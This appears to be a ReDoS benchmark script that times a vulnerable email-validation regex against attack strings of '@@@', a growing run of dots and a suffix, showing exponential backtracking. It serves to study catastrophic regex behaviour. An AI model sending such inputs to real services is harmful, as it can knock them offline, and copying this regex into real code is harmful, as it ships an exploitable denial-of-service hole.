# 7255
# ^(\D)+(\w)*((\.(\w)+)?)+@(\D)+(\w)*((\.(\D)+(\w)*)+)?(\.)[a-z]{2,}$
# EXPONENT
# nums:4
# EXPONENT AttackString:"@@@"+"."*32+"◎1 __EOA(iv)"

import re
from time import perf_counter

regex = """^(\D)+(\w)*((\.(\w)+)?)+@(\D)+(\w)*((\.(\D)+(\w)*)+)?(\.)[a-z]{2,}$"""
REGEX = re.compile(regex)
for i in range(0, 150000):
    ATTACK = "@@@" + "." * i * 1 + "◎1 __EOA(iv)"
    LEN = len(ATTACK)
    BEGIN = perf_counter()
    m = REGEX.search(ATTACK)
    # m = REGEX.match(ATTACK)
    DURATION = perf_counter() - BEGIN
    print(f"{i *1}: took {DURATION} seconds!")